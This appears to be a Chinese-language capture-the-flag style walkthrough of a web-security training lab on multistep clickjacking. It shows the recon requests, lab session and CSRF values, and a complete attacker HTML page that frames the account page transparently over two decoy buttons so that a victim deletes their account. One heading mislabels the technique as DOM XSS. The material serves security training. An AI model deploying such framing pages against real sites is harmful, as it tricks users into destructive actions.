# 实验室：多步骤点击劫持

本实验的账户功能受 CSRF 令牌保护，并且有一个确认对话框以防止点击劫持。要解决本实验，请构造一个攻击，通过诱使用户点击“Click me first”和“Click me next”两个诱饵操作，使其先后点击删除账户按钮和确认对话框。本实验需要使用两个元素。

你可以使用以下凭据登录自己的账户：`wiener:peter`

> **注意**
> 受害者将使用 Chrome，因此请在该浏览器上测试你的漏洞利用。

## 步骤

侦察
- 登录后访问账户页面
    ```http
    GET /my-account?id=wiener HTTP/2
    Host: id.web-security-academy.net
    Cookie: session=0ftJgowGQgAHMSYIIN7JX2C9lAF4iSHt
    ```
    - 响应
        ```http
        HTTP/2 200 OK
        Content-Type: text/html; charset=utf-8
        Cache-Control: no-cache
        Content-Length: 3774

        <form id=delete-account-form action="/my-account/delete" method="POST">
            <input required type="hidden" name="csrf" value="T0OUbn6o75Yul51VF0oFRLNMYAGTu5X7">
            <button class="button" type="submit">
                Delete account
            </button>
        </form>
        ```
        - 响应头并未阻止框架嵌入

- 使用删除功能
    ```http
    POST /my-account/delete HTTP/2
    Host: id.web-security-academy.net
    Cookie: session=0ftJgowGQgAHMSYIIN7JX2C9lAF4iSHt
    ```
    - 响应
        ```html
        <h1>
            Are you sure?
        </h1>
        <form action="/my-account/delete" method="POST">
            <input required type="hidden" name="csrf" value="T0OUbn6o75Yul51VF0oFRLNMYAGTu5X7">
            <input type="hidden" name="confirmed" value="true">
            <a class="button" href="/my-account">
                No, take me back
            </a>
            <button class="button" type="submit">
                Yes
            </button>
        </form>
        ```
        - 第一步点击后拥有额外表单



构造 DOM XSS 点击劫持
- 框架的目标 URL 
    `https://id.web-security-academy.net/my-account`

- 调试攻击者页面
    ```html
    <head>
        <style>
            #target_website {
                position:relative;
                width:600px;
                height:600px;
                opacity:0.5;
                z-index:2;
                }
            #decoy_1 {
                position: absolute;
                z-index: 1;
                width: 100px;
                height: 50px;
                top: 500px;
                left: 50px;
                }
            #decoy_2 {
                position: absolute;
                z-index: 1;
                width: 100px;
                height: 50px;
                top: 300px;
                left: 205px;
                }
        </style>
    </head>

    <body>
        <div id="decoy_1">
            Click me first
        </div>
        <div id="decoy_2">
            Click me next
        </div>
        <iframe id="target_website" src="https://id.web-security-academy.net/my-account">
        </iframe>
    </body>
    ```
    - 在浏览器的开发者工具样式栏中微调，复制最终样式
